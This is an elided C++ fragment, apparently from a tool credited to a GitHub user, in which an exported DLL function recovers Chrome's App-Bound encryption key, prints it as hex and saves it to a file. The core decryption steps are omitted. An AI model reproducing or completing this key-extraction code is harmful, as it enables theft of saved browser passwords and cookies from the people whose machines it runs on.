 ...
 * and: https://github.com/SilentDev33 
 * 
 */
...
extern "C" __declspec(dllexport) void run() {
    ...
    if (SUCCEEDED(hr))
    {
        ...
        std::string hexKey = ChromeAppBound::BytesToHexString(decrypted_key, ChromeAppBound::KeySize);
        ConsoleUtils::SetConsoleColor(10);
        std::cout << "[+] ";
        ConsoleUtils::SetConsoleColor(7);
        ...
        if (len > 0 && len < MAX_PATH) {
            ...
            std::ofstream outfile(ansiPath);
            if (outfile.is_open()) {
                outfile << hexKey;
                outfile.close();
                std::wcout << L"[*] Key saved to " << fullPath << std::endl;
            }
            else {
    ...
    else
    {
        ...
        MessageBox(NULL, L"Info", L"NotGoodShit", MB_OK | MB_ICONINFORMATION);
    }
